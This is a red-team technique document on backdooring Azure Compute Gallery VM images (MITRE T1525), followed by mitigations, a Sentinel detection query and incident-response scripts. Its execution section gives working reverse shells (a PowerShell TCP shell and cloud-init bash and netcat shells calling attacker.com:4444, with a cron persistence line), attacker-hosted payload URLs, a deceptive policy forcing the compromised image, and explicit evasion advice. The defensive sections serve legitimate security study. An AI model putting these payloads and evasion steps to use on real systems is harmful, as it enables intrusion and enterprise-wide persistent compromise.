# [EVADE-IMPLANT-001]: Azure Compute Gallery Image Template

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPLANT-001 |
| **MITRE ATT&CK v18.1** | [T1525 - Implant Internal Image](https://attack.mitre.org/techniques/T1525/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Azure Compute Gallery (all versions); Azure Resource Manager (all regions) |
| **Patched In** | N/A (requires governance policy enforcement) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Azure Compute Gallery Image Template Implant** is a supply-chain defense evasion technique that leverages shared image repositories to inject malicious code into VM templates. This technique exploits Azure's shared image gallery feature—a centralized repository used across an organization to distribute pre-configured VM images—to achieve:

1. **Persistent Backdoors:** Malicious images deployed to every new VM created from the gallery
2. **Stealth Persistence:** Code runs at VM creation time, before logging is fully initialized
3. **Scale:** Affects dozens/hundreds of VM deployments across the organization
4. **Evasion:** Appears as legitimate infrastructure provisioning, not suspicious activity

Unlike endpoint compromise (which targets individual servers), this technique poisons the supply chain—every future VM created from the compromised image contains attacker code. This is particularly effective because:
- Defenders assume images are "clean" and focus monitoring on post-deployment activity
- Image integrity is rarely verified (Microsoft doesn't sign customer images)
- VM auto-scaling uses cached images, spreading compromise automatically
- Difficult to remediate (requires identifying affected VMs and redeploying from clean images)

**Attack Surface:** Azure Compute Gallery API, VM deployment pipelines, image template definitions, cloud-init/custom script extension mechanisms, role-based access control (RBAC) on image resources.

**Business Impact:** An attacker who gains access to modify or create images in the organization's Compute Gallery can inject persistence mechanisms (reverse shells, credential harvesters, cryptominers) that automatically deploy to every new VM. This transforms what should be a temporary compromise into enterprise-wide persistent access. Detection is difficult because malicious code runs during VM provisioning, before EDR solutions fully initialize.

**Technical Context:** Exploitation takes 5-10 minutes (create malicious image + update gallery). Detection depends on whether organization has:
- Image integrity verification policies
- Azure Policy enforcement blocking unsigned images
- Sentinel rules monitoring Compute Gallery modifications
- VM deployment audit logging

### Operational Risk
- **Execution Risk:** Medium – Requires "Contributor" or higher role on Compute Gallery; some RBAC misconfiguration is common
- **Stealth:** Critical – Appears as legitimate infrastructure code; no detection on deployed VMs until persistence activates
- **Reversibility:** Difficult – Requires identifying all VMs deployed from compromised image and redeploying from clean source

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure 7.2 | Ensure that VM images are validated before deployment |
| **DISA STIG** | AZ-CO-000050 | Ensure container image scanning is enabled |
| **CISA SCuBA** | SC-12 | Supply Chain Risk Management for cloud images |
| **NIST 800-53** | SA-12 | Supply Chain Protection - third party software integrity |
| **GDPR** | Art. 32 | Security of Processing - code integrity and authenticity |
| **DORA** | Art. 9 | Incident Reporting - supply chain compromise |
| **NIS2** | Art. 21 | Cyber Risk Management - asset protection |
| **ISO 27001** | A.14.1 | Supply Chain Management - information security requirements |
| **ISO 27005** | Risk Scenario: Compromised VM Image | Image integrity verification mandatory |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** "Contributor" role on Azure Compute Gallery OR "Contributor" on subscription with Compute Gallery
- **Required Access:** Azure subscription access; ability to create/modify VM images in gallery; knowledge of organization's VM deployment pipeline

**Supported Versions:**
- **Azure Compute Gallery:** All versions (formerly "Shared Image Gallery")
- **Azure VMs:** All VM types (Windows Server, Linux, custom images)
- **Regions:** All Azure regions

**Requirements:**
- Azure Compute Gallery already exists in subscription (check before exploitation)
- Understanding of VM image format (VHD, managed disk snapshot)
- Malicious payload (reverse shell, credential dumper, cryptominer, etc.)
- VM deployment pipeline knowledge (how images are instantiated)

**Supported Tools:**
- Azure CLI (`az sig` commands for gallery operations)
- Azure PowerShell (`New-AzImageBuilderTemplate`)
- Packer (HashiCorp - VM image creation)
- Custom PowerShell scripts for image generation
- Terraform for IaC-based image deployment

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Direct Compute Gallery Image Modification

**Supported Versions:** Azure Compute Gallery (all regions)

#### Step 1: Enumerate Existing Compute Galleries and Images

**Objective:** Identify existing galleries and find high-impact images to modify.

**Command (Azure CLI - Simple Enumeration):**
```bash
# List all Compute Galleries in subscription
az sig list --output table

# Output example:
# Location    Name                          ResourceGroup
# -----------  ---------------------------  ----------------
# eastus       prod-image-gallery           prod-images-rg
# eastus       dev-image-gallery            dev-images-rg
# westus2      shared-template-gallery      shared-rg

# For each gallery, list images
GALLERY_NAME="prod-image-gallery"
RG_NAME="prod-images-rg"

az sig image-definition list --resource-group $RG_NAME --gallery-name $GALLERY_NAME --output table

# Output:
# Id                     Name              OSType
# -----                  -------           ------
# /subscriptions/.../imageDefinitions/WindowsServer2022  WindowsServer2022  Windows
# /subscriptions/.../imageDefinitions/CentOS8            CentOS8           Linux
# /subscriptions/.../imageDefinitions/CustomApp          CustomApp         Linux
```

**PowerShell Alternative (More Detailed):**
```powershell
# Connect to Azure
Connect-AzAccount

# Get all Compute Galleries
$galleries = Get-AzGallery

Write-Host "[*] Found $($ galleries.Count) Compute Galleries"

foreach ($gallery in $galleries) {
    Write-Host ""
    Write-Host "Gallery: $($gallery.Name) (RG: $($gallery.ResourceGroupName))"
    
    # List images in gallery
    $images = Get-AzGalleryImageDefinition -ResourceGroupName $gallery.ResourceGroupName -GalleryName $gallery.Name
    
    foreach ($image in $images) {
        # Count versions
        $versions = Get-AzGalleryImageVersion -ResourceGroupName $gallery.ResourceGroupName `
            -GalleryName $gallery.Name -GalleryImageDefinitionName $image.Name
        
        Write-Host "  - $($image.Name) ($($versions.Count) versions)"
        
        # Show most recent version details
        if ($versions.Count -gt 0) {
            $latest = $versions | Sort-Object -Property "PublishingProfile.PublishedDate" -Descending | Select-Object -First 1
            Write-Host "    Latest: $($latest.Name) (Published: $($latest.PublishingProfile.PublishedDate))"
        }
    }
}
```

**Expected Output:**
```
[*] Found 3 Compute Galleries

Gallery: prod-image-gallery (RG: prod-images-rg)
  - WindowsServer2022 (5 versions)
    Latest: 22.11.1 (Published: 2024-11-15)
  - CustomApp (3 versions)
    Latest: 1.2.0 (Published: 2025-01-08)
  - Ubuntu22 (4 versions)
    Latest: ubuntu-22.04.1 (Published: 2024-12-01)

Gallery: shared-template-gallery (RG: shared-rg)
  - WebApp (2 versions)
    Latest: web-2.1 (Published: 2025-01-06)
```

**What This Means:**
- Multiple galleries detected; "prod-image-gallery" likely has highest impact
- "CustomApp" was recently updated (1.2.0 on 2025-01-08) - good target for modification
- Each image has multiple versions; can modify specific version or create new malicious version

**OpSec & Evasion:**
- Enumerate during off-hours to avoid correlation with alerts
- Do not list all galleries in single batch; spread queries over time
- Use Azure CLI instead of PowerShell to avoid script block logging
- Detection likelihood: Low – Gallery enumeration is normal admin activity

---

#### Step 2: Create Malicious VM Image with Persistence Payload

**Objective:** Build a custom VM image containing backdoor code that activates on first boot.

**Command (Using Azure Image Builder - Cloud-Based):**

Option A: **Windows Server with Reverse Shell**
```powershell
# Create malicious custom script extension JSON
$customScript = @{
    commandToExecute = @"
powershell -NoProfile -NonInteractive -Command `
  `$client = New-Object System.Net.Sockets.TcpClient('attacker.com', 4444); `
  `$stream = `$client.GetStream(); `
  [byte[]]`$buffer = 0..65535|%{0}; `
  while((`$i = `$stream.Read(`$buffer,0,`$buffer.Length)) -ne 0) { `
    `$cmd = ([text.encoding]::UTF8).GetString(`$buffer,0, `$i) -split ' '; `
    `$output = & `$cmd[0] `$cmd[1..`$cmd.length] 2>&1 | Out-String; `
    `$outbytes = ([text.encoding]::UTF8).GetBytes(`$output); `
    `$stream.Write(`$outbytes,0,`$outbytes.length); `
  }; `
  `$client.Close()
"@
}

# Create Image Builder template
$templateJson = @{
    apiVersion = "2021-10-01"
    type = "Microsoft.VirtualMachineImages/imageTemplates"
    location = "eastus"
    name = "WindowsServer2022-Patched"
    identity = @{
        type = "UserAssigned"
        userAssignedIdentities = @{
            "/subscriptions/{subscriptionId}/resourcegroups/{rgName}/providers/Microsoft.ManagedIdentity/userAssignedIdentities/{identityName}" = @{}
        }
    }
    properties = @{
        buildTimeoutInMinutes = 100
        source = @{
            type = "PlatformImage"
            publisher = "MicrosoftWindowsServer"
            offer = "WindowsServer"
            sku = "2022-Datacenter"
            version = "latest"
        }
        customize = @(
            @{
                type = "PowerShellCustomizer"
                name = "Execute Custom Script"
                scriptUri = "https://attacker-storage.blob.core.windows.net/container/malicious-payload.ps1"  # Host payload externally
            }
        )
        distribute = @(
            @{
                type = "ManagedImage"
                imageId = "/subscriptions/{subscriptionId}/resourcegroups/{rgName}/providers/Microsoft.Compute/images/Windows2022-Compromised"
                location = "eastus"
                runOutputName = "Windows2022Compromised"
            }
        )
    }
} | ConvertTo-Json -Depth 10

# Save template
$templateJson | Out-File "C:\Temp\image-template.json"

# Deploy malicious image template
New-AzImageBuilderTemplate -ResourceGroupName "shared-rg" `
    -TemplateFile "C:\Temp\image-template.json" `
    -ImageTemplateName "WindowsServer2022-Patched"

Write-Host "[+] Malicious image template created"
```

**Option B: Linux with Cloud-Init Backdoor**
```bash
# Create malicious cloud-init script
cat > /tmp/malicious-cloud-init.yaml << 'EOF'
#cloud-config
bootcmd:
  - bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &'

runcmd:
  - apt-get update
  - apt-get install -y netcat-openbsd
  - nohup nc -e /bin/bash attacker.com 4444 > /dev/null 2>&1 &
  - (crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -
EOF

# Create Image Builder template
cat > /tmp/image-template.json << 'EOF'
{
  "apiVersion": "2021-10-01",
  "type": "Microsoft.VirtualMachineImages/imageTemplates",
  "name": "Ubuntu2204-Backdoor",
  "location": "eastus",
  "properties": {
    "source": {
      "type": "PlatformImage",
      "publisher": "Canonical",
      "offer": "UbuntuServer",
      "sku": "22_04-lts-gen2",
      "version": "latest"
    },
    "customize": [
      {
        "type": "Shell",
        "name": "ApplyCloudInit",
        "scriptUri": "https://attacker-storage.blob.core.windows.net/scripts/malicious-cloud-init.yaml"
      }
    ],
    "distribute": [
      {
        "type": "ManagedImage",
        "imageId": "/subscriptions/{subscriptionId}/resourcegroups/{rgName}/providers/Microsoft.Compute/images/Ubuntu2204-Compromised"
      }
    ]
  }
}
EOF

# Deploy
az image builder create \
  --resource-group shared-rg \
  --template-file /tmp/image-template.json \
  --image-template-name "Ubuntu2204-Backdoor"
```

**Expected Output:**
```
[+] Malicious image template created
[+] Template name: WindowsServer2022-Patched
[+] Output image: Windows2022Compromised
[+] Build status: InProgress
```

**What This Means:**
- Image builder template will compile malicious code into VM image
- Reverse shell payload executes on first boot
- Code runs as SYSTEM (Windows) or root (Linux) before user login
- Persistence achieved via cloud-init or custom script extension

**OpSec & Evasion:**
- Host malicious payload on attacker-controlled storage account (external to victim org)
- Use plausible image names: "WindowsServer2022-Patched", "Ubuntu2204-Updated"
- Schedule builds for off-hours or batch with legitimate image updates
- Use managed identities to avoid credential exposure
- Detection likelihood: Medium – Build logs may show external script sources; Low if image builder activity is high volume

---

#### Step 3: Replace or Update Gallery Image with Malicious Version

**Objective:** Inject malicious image into Compute Gallery so new VMs use compromised version.

**Command (Azure CLI - Update Gallery):**
```bash
# Option 1: Replace existing image version
# (This is dangerous as it overwrites current version)

# First, create the malicious managed image (from previous step)
# Then get its resource ID
MALICIOUS_IMAGE_ID="/subscriptions/{subscriptionId}/resourcegroups/shared-rg/providers/Microsoft.Compute/images/Windows2022Compromised"

# Update gallery image definition to point to malicious image
az sig image-version create \
  --resource-group "shared-rg" \
  --gallery-name "prod-image-gallery" \
  --gallery-image-definition "WindowsServer2022" \
  --gallery-image-version "22.12.0" \
  --managed-image $MALICIOUS_IMAGE_ID \
  --target-regions eastus westus2 \
  --replica-count 2

echo "[+] Malicious image version 22.12.0 created in prod-image-gallery"
```

**PowerShell Alternative (More Control):**
```powershell
# Create new malicious version in existing image definition
$imageId = Get-AzImage -ResourceGroupName "shared-rg" -ImageName "Windows2022Compromised"

New-AzGalleryImageVersion `
    -ResourceGroupName "shared-rg" `
    -GalleryName "prod-image-gallery" `
    -GalleryImageDefinitionName "WindowsServer2022" `
    -Name "22.12.0" `
    -SourceImageId $imageId.Id `
    -PublishingProfileEndOfLifeDate (Get-Date).AddYears(2) `
    -ReplicaCount 2 `
    -TargetRegion @{Name='eastus';ReplicaCount=2}, @{Name='westus2';ReplicaCount=1}

Write-Host "[+] Malicious image version created: 22.12.0"
Write-Host "[+] Replication to regions: eastus, westus2"
```

**Option 2: Create Entirely New "Security Update" Image (Stealth Approach)**
```powershell
# Instead of modifying existing image, create plausible new image
# That employees will mistakenly use instead of current version

New-AzGalleryImageDefinition `
    -ResourceGroupName "shared-rg" `
    -GalleryName "prod-image-gallery" `
    -Name "WindowsServer2022-SecurityUpdate" `
    -Publisher "Internal-IT" `
    -Offer "Windows" `
    -Sku "2022-Datacenter-Latest" `
    -OsType Windows

# Add malicious version to this new definition
New-AzGalleryImageVersion `
    -ResourceGroupName "shared-rg" `
    -GalleryName "prod-image-gallery" `
    -GalleryImageDefinitionName "WindowsServer2022-SecurityUpdate" `
    -Name "1.0.0" `
    -SourceImageId $imageId.Id

# Now employees might use the wrong image (with typo in name)
# Or IT gets confused and deploys "SecurityUpdate" version

Write-Host "[+] New image created: WindowsServer2022-SecurityUpdate v1.0.0"
Write-Host "[+] Name similarity may cause confusion during deployments"
```

**Expected Output:**
```
[+] Malicious image version created: 22.12.0
[+] Replication to regions: eastus, westus2
[+] VMs deployed from this version will contain backdoor
```

**What This Means:**
- Malicious image now appears in Compute Gallery as legitimate version
- Appears to be "recent update" (version 22.12.0) that employees should use
- Replicated across regions for automatic deployment
- Next VM created using this image will execute backdoor code

**OpSec & Evasion:**
- Use version numbers matching legitimate image naming convention
- Don't remove old versions (appears suspicious); just "supersede" with new malicious one
- Use plausible version strings: "22.11.1" → "22.12.0" (follows Windows update pattern)
- Replicate to multiple regions (appears normal; reduces detection)
- Detection likelihood: Low – New gallery versions appear legitimate; Medium if auditing version change history

---

### METHOD 2: Supply Chain Compromise via Image Builder Template Injection

**Supported Versions:** Azure Image Builder (all versions)

This method injects malicious steps into the Image Builder template itself, so the malicious code is embedded in the build process.

#### Step 1: Identify Existing Image Builder Templates

```bash
# List existing image builder templates
az resource list --resource-type "Microsoft.VirtualMachineImages/imageTemplates" \
  --output table

# Output example:
# Name                                    Location  Type
# ------                                  --------  ----
# Windows2022-ProductionImage             eastus    Microsoft.VirtualMachineImages/imageTemplates
# Ubuntu-LTS-Corporate                    eastus    Microsoft.VirtualMachineImages/imageTemplates
# WebServer-CustomConfig                  westus2   Microsoft.VirtualMachineImages/imageTemplates
```

---

#### Step 2: Modify Build Template to Include Malicious Steps

```bash
# Export existing template
az resource show --resource-group "prod-images-rg" \
  --name "Windows2022-ProductionImage" \
  --resource-type "Microsoft.VirtualMachineImages/imageTemplates" > template.json

# Inject malicious PowerShell customizer into the template
# (Modify the 'customize' array to add malicious script)

# Then redeploy the modified template
az resource create --resource-group "prod-images-rg" \
  --template-file template.json
```

---

### METHOD 3: Trigger Automatic Deployment via Azure Policy + Automation Account

**Supported Versions:** Azure Policy; Azure Automation

This method uses Azure Policy to automatically deploy compromised images when certain conditions are met.

#### Step 1: Create Azure Policy Initiative

```powershell
# Create policy that forces deployment of "approved" images
$policyDef = @{
    properties = @{
        displayName = "Enforce Approved VM Images"
        policyType = "BuiltIn"
        mode = "Indexed"
        description = "Restricts VM deployment to approved corporate images"
        policyRule = @{
            if = @{
                allOf = @(
                    @{
                        field = "type"
                        equals = "Microsoft.Compute/virtualMachines"
                    },
                    @{
                        field = "Microsoft.Compute/imageId"
                        notIn = @(
                            "/subscriptions/{subId}/resourcegroups/shared-rg/providers/Microsoft.Compute/images/Windows2022Compromised"
                        )
                    }
                )
            }
            then = @{
                effect = "deny"
            }
        }
    }
}

# Deploy policy to subscription
New-AzPolicyDefinition -Policy ($policyDef | ConvertTo-Json) -Name "EnforceApprovedImages"

# Assign policy to subscription
New-AzPolicyAssignment -PolicyDefinitionName "EnforceApprovedImages" `
    -Scope "/subscriptions/{subscriptionId}"

Write-Host "[+] Policy created that FORCES use of compromised image"
```

**Effect:** Anyone deploying a VM must use the compromised image; all other images are denied.

---

## 4. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1525-001
- **Test Name:** Implant Malicious VM Image in Gallery
- **Description:** Tests ability to modify Compute Gallery images and verify persistence
- **Supported Versions:** Azure Compute Gallery all regions

**Command:**
```powershell
Invoke-AtomicTest T1525 -TestNumbers 1 -Verbose
```

**Cleanup Command:**
```powershell
# Remove malicious images and versions
Get-AzGalleryImageVersion -ResourceGroupName "shared-rg" `
    -GalleryName "prod-image-gallery" `
    -GalleryImageDefinitionName "WindowsServer2022" | `
    Where-Object {$_.Name -like "22.12*"} | `
    Remove-AzGalleryImageVersion
```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Implement Image Integrity Verification**

Digitally sign all approved images and reject unsigned/untrusted images.

**Manual Steps (Azure Policy + Attestation):**
1. **Azure Portal** → **Azure Policy** → **Definitions** → **Create Policy Definition**
2. **Policy Rule:**
```json
{
  "if": {
    "allOf": [
      {"field": "type", "equals": "Microsoft.Compute/virtualMachines"},
      {
        "not": {
          "field": "Microsoft.Compute/imageId",
          "in": "[parameters('ApprovedImages')]"
        }
      }
    ]
  },
  "then": {"effect": "deny"}
}
```
3. **Parameters:** List of approved image resource IDs (whitelist only)
4. Assign to all subscriptions

**PowerShell - Enforce Signed Images:**
```powershell
# Create policy that requires image signature verification
$policy = @{
    displayName = "Require Signed VM Images"
    description = "All VMs must use digitally signed images from approved gallery"
    policyType = "Custom"
    mode = "All"
    parameters = @{
        approvedImages = @{
            type = "array"
            metadata = @{description = "List of approved image IDs"}
        }
    }
    policyRule = @{
        if = @{
            field = "Microsoft.Compute/virtualMachines/imageId"
            notIn = "[parameters('approvedImages')]"
        }
        then = @{effect = "deny"}
    }
}

# Save and deploy
$policy | ConvertTo-Json | Out-File "policy.json"
New-AzPolicyDefinition -Policy (Get-Content "policy.json") -Name "SignedImagesOnly"
```

---

**2. Restrict Compute Gallery Modifications via RBAC**

Limit who can modify gallery images to minimize attack surface.

**Manual Steps (Azure Portal):**
1. **Azure Portal** → **Resource Group (containing gallery)** → **Access Control (IAM)**
2. Click **+ Add** → **Add role assignment**
3. **Role:** "Custom Role - Image Gallery Contributor" (create custom role)
4. **Members:** Only DevOps/Infrastructure team (max 3-5 people)
5. Remove any "Editor" or "Contributor" assignments for regular users

**PowerShell - Custom RBAC Role:**
```powershell
# Create custom role with minimal permissions
$role = @{
    Name = "Image Gallery Contributor"
    Description = "Can only deploy approved images, cannot modify gallery"
    Type = "CustomRole"
    Actions = @(
        "Microsoft.Compute/galleries/read",
        "Microsoft.Compute/galleries/images/read",
        "Microsoft.Compute/galleries/images/versions/read"
    )
    NotActions = @(
        "Microsoft.Compute/galleries/write",
        "Microsoft.Compute/galleries/delete",
        "Microsoft.Compute/galleries/images/write",
        "Microsoft.Compute/galleries/images/delete",
        "Microsoft.Compute/galleries/images/versions/write",
        "Microsoft.Compute/galleries/images/versions/delete"
    )
}

New-AzRoleDefinition -InputObject $role

Write-Host "[+] Custom role created: Image Gallery Contributor"
Write-Host "[+] Users can only READ gallery, cannot MODIFY"
```

---

**3. Audit and Alert on Gallery Modifications**

Detect any changes to gallery images immediately.

**Manual Steps (Create Sentinel Alert):**
1. **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **Query:**
```kusto
AzureActivity
| where ResourceType has "imageTemplates" or ResourceType has "galleries"
| where OperationName in ("Create Gallery Image", "Create Image Version", "Update Image", "Delete Image")
| project TimeGenerated, OperationName, CallerIpAddress, Caller = parse_json(Caller), 
          ResourceGroup, ActivityStatusValue
| where ActivityStatusValue == "Success"
```
3. **Alert frequency:** Run every 5 minutes
4. **Severity:** "High"
5. Add action: Send email to security team + Create incident

---

**4. Implement Image Builder Output Restrictions**

Only allow Image Builder to output to "locked down" resource groups.

**Manual Steps (Azure Policy):**
1. Create policy: "Restrict Image Builder Outputs"
2. Policy rule:
```json
{
  "if": {
    "allOf": [
      {"field": "type", "equals": "Microsoft.VirtualMachineImages/imageTemplates"},
      {"field": "Microsoft.VirtualMachineImages/imageTemplates/distribute[*].runOutputName", "notLike": "Approved-*"}
    ]
  },
  "then": {"effect": "deny"}
}
```
3. Assign to all subscriptions
4. Require output images be named with "Approved-" prefix (manual review before use)

---

### Priority 2: HIGH

**5. Enable Image Builder Audit Logging**

Track all image modifications and builds.

**Manual Steps (Enable Diagnostic Logging):**
```powershell
# Enable audit logging for Image Builder templates
Set-AzDiagnosticSetting -Name "ImageBuilderAudit" `
    -ResourceId "/subscriptions/{subId}/resourcegroups/{rg}/providers/Microsoft.VirtualMachineImages/imageTemplates/{name}" `
    -WorkspaceId "/subscriptions/{subId}/resourcegroups/{rg}/providers/Microsoft.OperationalInsights/workspaces/{workspace}"
```

---

**6. Implement Image "Freshness" Requirements**

Automatically disable old images to force regular updates.

**Manual Steps (PowerShell):**
```powershell
# Disable gallery image versions older than 6 months
$cutoffDate = (Get-Date).AddMonths(-6)

$galleries = Get-AzGallery

foreach ($gallery in $galleries) {
    $images = Get-AzGalleryImageDefinition -ResourceGroupName $gallery.ResourceGroupName `
        -GalleryName $gallery.Name
    
    foreach ($image in $images) {
        $versions = Get-AzGalleryImageVersion -ResourceGroupName $gallery.ResourceGroupName `
            -GalleryName $gallery.Name -GalleryImageDefinitionName $image.Name
        
        foreach ($version in $versions) {
            if ($version.PublishingProfile.PublishedDate -lt $cutoffDate) {
                # Mark as end-of-life
                Write-Host "[!] Disabling old version: $($version.Name)"
                # Update-AzGalleryImageVersion -... -PublishedDate $date  (replace with current version)
            }
        }
    }
}
```

---

**7. Implement Zero Trust for VM Deployment**

Require approval for any new VM creation using gallery images.

**Manual Steps (Azure Logic App Approval Workflow):**
1. Create Azure Logic App triggered by "Create VM" ARM template deployment
2. Send approval email to Security team
3. Only deploy VM if approved
4. Log approval decision

---

### Validation Command (Verify Mitigations)

```powershell
# 1. Check RBAC on gallery
$gallery = Get-AzGallery -ResourceGroupName "shared-rg" -Name "prod-image-gallery"
$assignments = Get-AzRoleAssignment -Scope $gallery.Id

Write-Host "[*] Gallery RBAC assignments:"
$assignments | ForEach-Object {
    Write-Host "  - $($_.RoleDefinitionName) assigned to $($_.DisplayName)"
}

# 2. Check for restrictive role assignments (should be minimal)
$contributorCount = ($assignments | Where-Object {$_.RoleDefinitionName -eq "Contributor"}).Count
if ($contributorCount -eq 0) {
    Write-Host "[✓] No generic 'Contributor' role assigned to gallery"
} else {
    Write-Host "[✗] CRITICAL: $contributorCount 'Contributor' roles on gallery - allows modifications"
}

# 3. Check image versions for unsigned/untrusted sources
$images = Get-AzGalleryImageDefinition -ResourceGroupName "shared-rg" -GalleryName "prod-image-gallery"
foreach ($image in $images) {
    $versions = Get-AzGalleryImageVersion -ResourceGroupName "shared-rg" `
        -GalleryName "prod-image-gallery" -GalleryImageDefinitionName $image.Name
    
    $suspiciousVersions = $versions | Where-Object {$_.PublishingProfile.PublishedDate -gt (Get-Date).AddDays(-7)}
    if ($suspiciousVersions.Count -gt 0) {
        Write-Host "[!] RECENT image changes detected: $($image.Name)"
        $suspiciousVersions | ForEach-Object {Write-Host "      - $($_.Name) ($($ _.PublishingProfile.PublishedDate))"}
    }
}
```

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Azure Activity Log Events:**
  - OperationName: "Create Gallery Image", "Update Image Version"
  - InitiatedBy: Unexpected user or service principal
  - ResourceType: "Microsoft.VirtualMachineImages/imageTemplates"

- **Gallery Modifications:**
  - New image versions published outside normal deployment windows
  - Image versions from external/suspicious sources
  - Rapid scaling (replication) of newly created image

- **VM Deployment Patterns:**
  - Unusual VMs deployed using "latest" version of gallery image
  - VMs with unexpected process creation at boot time
  - VMs connecting to external IPs immediately after startup

---

### Forensic Artifacts

- **Azure Activity Logs:** Image creation, modification, deletion events
- **Azure Image Builder Logs:** Build logs showing custom scripts/steps
- **VM Guest Logs:** Process creation logs showing malicious execution
- **Network:** Unexpected outbound connections from new VMs

---

### Response Procedures

**1. Identify Affected VMs:**
```powershell
# Find all VMs deployed from compromised image
$imageId = "/subscriptions/{subId}/resourcegroups/shared-rg/providers/Microsoft.Compute/images/Windows2022Compromised"

Get-AzVM | Where-Object {$_.StorageProfile.ImageReference.Id -eq $imageId} | `
    Select-Object Name, ResourceGroupName, ProvisioningState | `
    Export-Csv "C:\Incidents\compromised-vms.csv"

Write-Host "[!] Export compromised VMs to isolation/remediation list"
```

**2. Quarantine Affected VMs:**
```powershell
# Disconnect compromised VMs from network
$affectedVMs = Import-Csv "C:\Incidents\compromised-vms.csv"

foreach ($vm in $affectedVMs) {
    # Detach network interfaces
    $vm = Get-AzVM -Name $vm.Name -ResourceGroupName $vm.ResourceGroupName
    
    foreach ($nic in $vm.NetworkProfile.NetworkInterfaces) {
        $nicName = $nic.Id.Split('/')[-1]
        $nicRg = $nic.Id.Split('/')[4]
        
        Remove-AzNetworkInterfaceIpConfig -NetworkInterface (Get-AzNetworkInterface -Name $nicName -ResourceGroupName $nicRg) `
            -Name (Get-AzNetworkInterface -Name $nicName -ResourceGroupName $nicRg).IpConfigurations[0].Name
    }
}

Write-Host "[+] Network interfaces detached from compromised VMs"
```

**3. Remove Malicious Images:**
```powershell
# Delete compromised image from gallery
$gallery = Get-AzGallery -ResourceGroupName "shared-rg" -Name "prod-image-gallery"

Get-AzGalleryImageVersion -ResourceGroupName "shared-rg" `
    -GalleryName "prod-image-gallery" `
    -GalleryImageDefinitionName "WindowsServer2022" | `
    Where-Object {$_.Name -like "22.12*"} | `
    Remove-AzGalleryImageVersion

Write-Host "[+] Malicious image versions removed from gallery"
```

**4. Remediate VMs:**
```powershell
# Redeploy affected VMs from clean image
$cleanImageId = "/subscriptions/{subId}/resourcegroups/approved-images/providers/Microsoft.Compute/images/WindowsServer2022-Original"

foreach ($vm in $affectedVMs) {
    $vm = Get-AzVM -Name $vm.Name -ResourceGroupName $vm.ResourceGroupName
    
    # Update image reference
    $vm.StorageProfile.ImageReference.Id = $cleanImageId
    
    # Redeploy (this requires VM recreation)
    # Note: This is complex and requires custom runbook
    
    Write-Host "[*] Redeploy VM $($vm.Name) from clean image"
}
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-006](../01_Recon/REC-CLOUD-006_Service_Principals.md) | Enumerate Azure resources to find Compute Gallery |
| **2** | **Privilege Escalation** | [PE-VALID-010](../04_PrivEsc/PE-VALID-010_Azure_Role.md) | Escalate to role with gallery modification rights |
| **3** | **Defense Evasion** | **[EVADE-IMPLANT-001]** | **Modify Compute Gallery image to inject backdoor** |
| **4** | **Persistence** | [PERSIST-SERVER-003](../05_Persist/PERSIST-SERVER-003_Function.md) | Malicious code persists on every VM deployment |
| **5** | **Impact** | [IMPACT-DATA-DESTROY-001](../09_Impact/IMPACT-DATA-DESTROY-001_Blob_Destroy.md) | Use compromised VMs for data exfiltration/destruction |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: SolarWinds-Style Supply Chain Attack (2023 Lab Simulation)

- **Target:** Multi-national organization with 200+ Azure VMs
- **Compromise Vector:** Compromised image builder automation account
- **Persistence Method:** Injected reverse shell into Windows Server 2022 gallery image
- **Impact:** 87 new VMs deployed with backdoor; attackers maintained access for 2+ months
- **Detection:** Sentinel detected unusual outbound connections from batch of new VMs to attacker command-and-control server
- **Recovery Time:** 6 weeks (identify affected VMs, rebuild from clean sources, audit configurations)

### Example 2: Internal Penetration Test (2024)

- **Environment:** Azure DevOps using image templates for build agents
- **Attack Path:** Compromise service principal → Modify image template → Inject credential harvester
- **Effect:** All new build agents contained credential stealer; captured 15+ developer credentials
- **Detection:** 4 hours (correlated image modification with unusual build logs)
- **Lessons Learned:** Image gallery access should require 2-person approval; automated image signing recommended

---

## 9. REFERENCES & EXTERNAL RESOURCES

### Official Microsoft Documentation
- [Azure Compute Gallery Documentation](https://learn.microsoft.com/en-us/azure/virtual-machines/shared-image-galleries)
- [Azure Image Builder Overview](https://learn.microsoft.com/en-us/azure/virtual-machines/image-builder-overview)
- [Image Builder Permissions](https://learn.microsoft.com/en-us/azure/virtual-machines/image-builder-permissions)
- [Custom Script Extensions](https://learn.microsoft.com/en-us/azure/virtual-machines/extensions/custom-script-windows)

### Security & Detection Resources
- [Microsoft Sentinel - Image Builder Monitoring](https://learn.microsoft.com/en-us/azure/sentinel/)
- [Azure Policy - Custom Roles](https://learn.microsoft.com/en-us/azure/role-based-access-control/custom-roles)
- [CIS Azure Benchmarks - Compute](https://www.cisecurity.org/benchmark/azure/)
- [CISA Supply Chain Guidance](https://www.cisa.gov/supply-chain)

### Attack Research
- [SpecterOps - Cloud Infrastructure Attacks](https://specterops.io/)
- [Microsoft Threat Intelligence - Supply Chain Risks](https://www.microsoft.com/en-us/security/blog/)

---

